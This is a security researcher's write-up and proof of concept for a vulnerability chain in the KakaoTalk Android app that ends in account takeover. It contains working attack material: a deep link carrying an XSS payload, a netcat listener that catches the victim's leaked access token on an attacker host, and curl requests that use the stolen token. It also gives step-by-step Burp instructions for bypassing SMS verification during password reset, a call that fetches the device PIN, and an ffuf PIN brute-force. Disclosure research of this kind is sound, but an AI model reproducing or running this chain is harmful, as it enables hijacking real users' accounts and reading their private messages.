# Account Takeover

- [CommerceBuyActivity](#commercebuyactivity)
- [URL Redirect to XSS](#url-redirect-to-xss)
- [MyProfileSettingsActivity](#myprofilesettingsactivity)
- [Kakao Mail Takeover](#deep-link-to-kakao-mail-account-takeover)
- [Password Reset](#kakaotalk-password-reset-with-burp)
- [PoC](#poc)
  - [Malicious Deep Link](#attacker-prepares-the-malicious-deep-link)
  - [Access Token Leakage](#victim-clicks-the-link-and-leaks-an-access-token-to-the-attacker)
  - [Password Reset](#attacker-uses-the-access-token-to-reset-the-victims-password)
  - [Profit](#attacker-registers-herhis-device-the-victims-kakaotalk-account)
- [Appendix](#appendix)
  - [ffuf](#brute-forcing-with-ffuf)

In KakaoTalk `10.3.4` there are a couple of low-hanging fruit vulnerabilities which when combined together allow an attacker to steal another user's chat messages.

In the following we describe the vulnerabilities in detail and present a [PoC](#poc) at the end.

## CommerceBuyActivity

The `CommerceBuyActivity` WebView is the main entry point and very interesting from an attacker's point of view:

- It's exported and can be started with a deep link (e.g., `adb shell am start kakaotalk://buy`)
- It has Javascript enabled (`settings.setJavaScriptEnabled(true);`)
- It supports the `intent://` [scheme](https://developer.chrome.com/docs/multidevice/android/intents/) to send data to other (non-exported) app components via Javascript. For example, the URI `"intent:#Intent;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity;S.EXTRA_URL=https://foo.bar;end"` loads the website `https://foo.bar` in the `MyProfileSettingsActivity` WebView.
- There's no sanitization of `intent://` URIs (e.g., the `Component` or `Selector` is **not** set to `null`). So, potentially any app component can be accessed.

This means that if we find a way to run our own Javascript inside the `CommerceBuyActivity` we would have the ability to start arbitrary (non-exported) app components when the user clicks on a malicious `kakaotalk://buy` deep link.

Unfortunately, we can't load arbitrary attacker-controlled URLs as there is some validation going on:

```java
public final String m17260P5(Uri uri) {
    String m36725d = C24983v.m36725d();
    if (uri != null) {
        if (!C46907a.m54284B(uri.toString(), new ArrayList(Arrays.asList(C47684e.f174778c0, "buy")))) {
            return null;
        }
        if (C43097e.m51424i(uri.getQueryParameter("refresh"), RTCStatsParser.Key.TRUE)) {
            this.f33349x = true;
        }
        if (("kakaotalk".equals(uri.getScheme()) || "alphatalk".equals(uri.getScheme())) && "buy".equals(uri.getHost())) {
            if (!TextUtils.isEmpty(uri.getPath())) {
                m36725d = String.format("%s%s", m36725d, uri.getPath());
            }
            if (!TextUtils.isEmpty(uri.getQuery())) {
                m36725d = String.format("%s?%s", m36725d, uri.getQuery());
            }
            if (!TextUtils.isEmpty(uri.getFragment())) {
                return String.format("%s#%s", m36725d, uri.getFragment());
            }
            return m36725d;
        } else if (C14325o2.f55096k.matcher(uri.toString()).matches()) {
            String uri2 = uri.toString();
            if (uri2.startsWith("http://")) {
                return uri2.replace("http://", "https://");
            }
            return uri2;
        }
    }
    return m36725d;
}
```

If you take a look at the code you'll recognize that we control the path, query parameters and fragment of the URL. However, everything is prefixed with the String `m36725d` which is `https://buy.kakao.com` in our case. That means if a user clicks on the deep link `kakaotalk://buy/foo` the URL `https://buy.kakao.com/foo` gets loaded in the `CommerceBuyActivity` WebView.

Maybe there's an Open Redirect or XSS issue on `https://buy.kakao.com` so that we can run Javascript? 🤔

## URL Redirect to XSS

While digging into `https://buy.kakao.com` I identified the endpoint `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` which allows to redirect to any `kakao.com` domain. This vastly increased my chances to find a XSS flaw as there are many many subdomains under `kakao.com`.

To find a vulnerable website I just googled for `site:*.kakao.com inurl:search -site:developers.kakao.com -site:devtalk.kakao.com` and found `https://m.shoppinghow.kakao.com/m/search/q/yyqw6t29`. The string `yyqw6t29` looked like a [DOM Invader canary](https://portswigger.net/burp/documentation/desktop/tools/dom-invader/settings/canary) to me, so I investigated further. Funny enough, there was already a Stored XSS as `https://m.shoppinghow.kakao.com/m/search/q/alert(1)` popped up an alert box. Searching the DOM brought up the Stored XSS payload `[해외]test "><svg/onload=alert(1);// Pullover Hoodie`.

Continuing to browse the DOM I discovered another [endpoint](https://m.shoppinghow.kakao.com/m/product/V25084142918/q:alert(1)) which was then vulnerable to DOM XSS. Testing the URL with Burp Suite's DOM Invader quickly brought up a couple of issues and eventually the PoC XSS payload turned out to be as simple as `"><img src=x onerror=alert(1);>`.

At this point we could run arbitrary Javascript in the `CommerceBuyActivity` WebView when the user clicks on a deep link such as `kakaotalk://auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/V25084142918/q:"><img src=x onerror=alert(1);>`.

Since the `CommerceBuyActivity` supports the `intent://` scheme we could now start arbitrary non-exported app components 🥳

## MyProfileSettingsActivity

Digging further, we identified the non-exported `MyProfileSettingsActivity` WebView which had a couple of issues.

First of, it allowed to load arbitrary URLs:

```java
public final void onCreate(Bundle bundle) {
    String str;
    super.onCreate(bundle);
    String str2 = null;
    if (getIntent().hasExtra("EXTRA_URL")) {
        str = getIntent().getStringExtra("EXTRA_URL");
    } else {
        str = null;
    }
    if (getIntent().hasExtra("EXTRA_TITLE")) {
        str2 = getIntent().getStringExtra("EXTRA_TITLE");
    }
    WebSettings settings = this.f192507q.getSettings();
    settings.setJavaScriptEnabled(true);
    settings.setSupportZoom(true);
    settings.setBuiltInZoomControls(true);
    settings.setJavaScriptCanOpenWindowsAutomatically(true);
    WebViewHelper.Companion companion = WebViewHelper.INSTANCE;
    companion.getInstance().appendKakaoTalkToUserAgentString(settings);
    this.f192507q.setWebViewClient(new C8206a());
    this.f192507q.setWebChromeClient(new C8207b(this.f192508r));
    this.f192507q.setDownloadListener(new C34313v1(this, 0));
    if (str2 != null) {
        setTitle(str2);
    }
    if (str == null) {
        str = C24983v.m36731j(C47684e.f174774b, "android/adid/manage.html");
    }
    WebView webView = this.f192507q;
    HashMap m16559U5 = m16559U5();
    if (C55281p.m61314a0(C47684e.f174709D0, Uri.parse(str).getHost(), true)) {
        m16559U5.putAll(companion.getInstance().getBreweryHeader());
    }
    C52084x c52084x = C52084x.f192756a;
    webView.loadUrl(str, m16559U5);
}
```

This includes `javascript://` and `data://` schemes which allow to run Javascript. Also, it supports `content://` URLs, so a URL such as `content://com.kakao.talk.FileProvider/onepass/PersistedInstallation.W0RFRkFVTFRd+MTo1NTIzNjczMDMxMzc6YW5kcm9pZDpiNjUwZmVmOGI2MDY1MzVm.json` opens KakaoTalk's Firebase Installation configuration in the `MyProfileSettingsActivity` WebView.

Last but not least, it leaked an access token in the `Authorization` HTTP header. For example, a command such as `adb shell am start "intent:#Intent\;component=com.kakao.talk/.activity.setting.MyProfileSettingsActivity\;S.EXTRA_URL=https://foo.bar\;end"` would send the token to `https://foo.bar`.

What could we do with this token? Maybe taking over a victim's KakaoTalk account?

## Deep Link to Kakao Mail Account Takeover

As explained in the previous section the `MyProfileSettingsActivity` is not exported, but we could start it via `CommerceBuyActivity` with the trick explained above. By crafting a malicious deep link we could send the access token to an attacker-controlled server:

```
kakaotalk://buy/auth/0/cleanFrontRedirect?returnUrl=https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">
```

Let's break it down:

- `kakaotalk://buy` fires up `CommerceBuyActivity`
- `/auth/0/cleanFrontRedirect?returnUrl=` "compiles" to `https://buy.kakao.com/auth/0/cleanFrontRedirect?returnUrl=` and redirects to any `kakao.com` domain
- `https://m.shoppinghow.kakao.com/m/product/Q24620753380/q:` has the XSS issue
- `"><img src=x onerror="document.location=atob('aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw=');">` is the XSS payload. We had to Base64 encode the "attacker URL" to bypass some sanitization checks.

Now, in possession of the access token what could we do with it? We could use it takeover a victim's Kakao Mail account used for KakaoTalk registration.

**TODO** If the victim doesn't have a Kakao Mail account it *might* be possible to create a new Kakao Mail account on her/his behalf. This is interesting because creating a new Kakao Mail account overwrites the user's previous registered email-address with no additional checks.

First, we needed to check whether the victim actually uses Kakao Mail:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.3.8 An/11 en' -H $'Authorization: 601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1693786891&lang=en&vc=2610380&email=2&adid=&adid_status=-1'
```

Next, we had to grab another access token to access Kakao Mail:

```bash
curl -i -s -k -X $'POST' \
    -H $'Host: api-account.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.3.8 An/11 en' -H $'Authorization: 601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e' -H $'A: android/10.3.8/en' -H $'C: 2cc348d0-b7f7-464c-b72b-1e3f66a04362' -H $'Content-Type: application/x-www-form-urlencoded' -H $'Content-Length: 174' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    --data-binary $'key_type=talk_session_info&key=601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e&referer=talk' \
    $'https://api-account.kakao.com/v1/auth/tgt'
```

This was an example response:

```json
{"code":0,"token":"5e09081b0cce35288422a0b6589ef860","expires":1700735745,"verifyToken":null}
```

With the newly gathered token we could access a victim's Kakao Mail account with Burp. Here's a way for you to reproduce it:

1. Launch Burp's browser: go to the `Proxy > Intercept` tab, click `Open browser` and visit `https://mail.kakao.com`
2. Go to the `Repeater` tab and create a new `HTTP` request (click on the `+` button).
3. Paste in the following (adapt the `Ka-Tgt` header accordingly):
```
GET / HTTP/2
Host: talk.mail.kakao.com
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 11; sdk_gphone_arm64 Build/RSR1.210722.013.A6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36;KAKAOTALK 2610380
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Km-Viewer-Ver: 1
Kakaotalk-Agent: os=android;osver=30;appver=10.3.8;lang=en;dtype=1;idiom=phone;device=SDK_GPHONE_ARM64
Ka-Tgt: 5e09081b0cce35288422a0b6589ef860
X-Requested-With: com.kakao.talk
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9
```
4. Right-click in the request window, select `Request in browser > In original session` and copy the URL into Burp's browser.

## KakaoTalk Password Reset with Burp

Since we could now access the victim's Kakao Mail account a password reset was the next logical step. The only additional information required were the victim's email address, nickname and phone number which we got with the same curl query that we used above:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.3.8 An/11 en' -H $'Authorization: 601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e' -H $'A: android/9.5.0/en' -H $'C: a327a1ad-b417-499a-abf7-48da89076e7c' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/account/more_settings.json?os_version=30&model=SDK_GPHONE_ARM64&since=1693786891&lang=en&vc=2610380&email=2&adid=&adid_status=-1'
```

Changing the password via `https://accounts.kakao.com` turned out to be a bit complicated as we had to bypass 2FA via SMS. However, it was as simple as intercepting and modifying a couple of requests with Burp. This is how you can do it:

1. Using the Burp browser go to `https://accounts.kakao.com` and click on `Reset Password`.
2. Add the victim's email address on the next page (`Reset password for your Kakao Account`). Before clicking on `Next`, enable the `Intercept` feature in Burp.
3. In Burp, forward all requests until you see a POST request to `/kakao_accounts/check_verify_type_for_find_password.json`. Right-click and select `Do intercept > Response to this request`.
4. In the response change `verify_types` to `0` (this sends the verification code to the victim's email address and not to her/his phone):
```json
{
  "status": 0,
  "verify_types": [
    0
  ],
  "suspended": false,
  "dormant": false,
  "kakaotalk": false,
  "expired": false,
  "created_at": 1700754321,
  "two_step_verification": false,
  "is_fill_in_email": false,
  "account_type": 0,
  "display_id": null
}
```
5. Disable `Intercept` in Burp and go back to Burp's browser. Click on `Using email address`.
6. Enter the victim's nickname and email address on the next page and click the `Verify` button.
7. Open a new browser tab and paste the Burp Repeater URL to access the user's Kakao Mail account (as described in the [previous](#deep-link-to-kakao-mail-account-takeover) section).
8. Grab the verification code from the email and enter it to proceed to the next page.
9. On the page `Additional user verification will proceed to protect your Kakao Account.`, enable `Intercept` in Burp again, enter some values and click `Confirm`. Back in Burp when you see a POST request to `/kakao_accounts/check_phone_number.json`, adjust the `iso_code` and `phone_number` (without country code) parameters in the request body. Forward the request and disable the `Intercept` option again.
10. Finally, you can enter the new password.

## PoC

The goal of the PoC is to register [KakaoTalk for Windows or MacOS](https://www.kakaocorp.com/page/service/service/KakaoTalk?lang=en) (or the open-source client [KiwiTalk](https://github.com/KiwiTalk/KiwiTalk)) to a victim's account to read her/his **non-end-to-end** encrypted chat messages.

The steps for an attacker are as follows:

### Attacker prepares the malicious deep link

First, she/he stores the payload to a file, ...

```javascript
<script>
location.href = decodeURIComponent("kakaotalk%3A%2F%2Fbuy%2Fauth%2F0%2FcleanFrontRedirect%3FreturnUrl%3Dhttps%3A%2F%2Fm.shoppinghow.kakao.com%2Fm%2Fproduct%2FQ24620753380%2Fq%3A%22%3E%3Cimg%20src%3Dx%20onerror%3D%22document.location%3Datob%28%27aHR0cDovLzE5Mi4xNjguMTc4LjIwOjU1NTUvZm9vLmh0bWw%3D%27%29%3B%22%3E");
</script>
```

... starts the HTTP server and ...

```bash
$ python3 -m http.server 8080
```

... opens a Netcat listener in another terminal window: `$ nc -lp 5555`. Easy ;-)

### Victim clicks the link and leaks an access token to the attacker

Next, the attacker sends a URL (e.g., `http://192.168.178.20:5555/foo.html`) and waits until the victim clicks it. The access token should be then leaked in the Netcat listener:

```bash
GET /foo.html HTTP/1.1
Host: 192.168.178.20:5555
Connection: keep-alive
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Linux; Android 10; M2004J19C Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/119.0.6045.66 Mobile Safari/537.36;KAKAOTALK 2610420;KAKAOTALK 10.4.2
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
authorization: 601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e
os_name: Android
kakao-buy-version: 1.0
os_version: 10.4.2
X-Requested-With: com.kakao.talk
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
```

### Attacker uses the access token to reset the victim's password

Assuming the victim has a Kakao Mail account, the attacker can now reset her/his KakaoTalk password (see instructions [above](#kakaotalk-password-reset-with-burp)).

### Attacker registers her/his device the victim's KakaoTalk account

When logging into KakaoTalk for Windows/MacOS or KiwiTalk with the victim's credentials a second authentication factor is required. It's a simple 4-digit pin which is sent to the victim's KakaoTalk mobile app. Unfortunately, the pin can't be brute-forced as there's some rate limiting going on at the endpoint `https://katalk.kakao.com/win32/account/register_device.json` (after 5 attempts the `device_uuid` is blocked).

Luckily, we can still use the gathered access token to grab the pin number from the KakaoTalk backend:

```bash
curl -i -s -k -X $'GET' \
    -H $'Host: katalk.kakao.com' -H $'Accept-Language: en' -H $'User-Agent: KT/10.3.8 An/11 en' -H $'Authorization: 601d3b6236df486f9908196d375ae9e800000017007543214660010AJixY80Cv2-738b6ba0d2e81934d67f298b1c77f2e5d71dcd1ff77b85563f0cd921b1a98f1e' -H $'A: android/10.3.8/en' -H $'C: 48d380e2-4513-44a7-b0df-4408c8091502' -H $'Accept-Encoding: json, deflate, br' -H $'Connection: close' \
    $'https://katalk.kakao.com/android/sub_device/settings/info.json'
```

Example response:

```json
{"status":0,"isVerified":true,"passcode":"8825"}
```

And you're in! Profit 🥳🥳🥳

## Appendix

In this section I mainly keep my notes.

### Brute-forcing with ffuf

To brute-force the 4-digit pin we can use `ffuf` to brute-force it:

1. Store the following HTTP request to a file:

```
POST /win32/account/register_device.json HTTP/1.1
Host: katalk.kakao.com
User-Agent: KT/3.4.3 Wd/10.0 ko
Accept-Encoding: gzip, deflate, br
Accept: */*
Connection: close
Content-Type: application/x-www-form-urlencoded
A: win32/3.4.3/ko
X-VC: 353ca125385092ac
Accept-Language: ko
Content-Length: 166

email=foo%40kakao.com&password=bar&device_name=sdk_gphone_arm64&device_uuid=c2RrX2dwaG9uZV9hcm0zMg==&permanent=true&once=false&passcode=FUZZ
```

2. Run `ffuf` with the [4-digits-0000-9999](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/4-digits-0000-9999.txt) dictionary:

```bash
$ ffuf -w 4-digits-0000-9999.txt -request request.txt -fs 15,177
```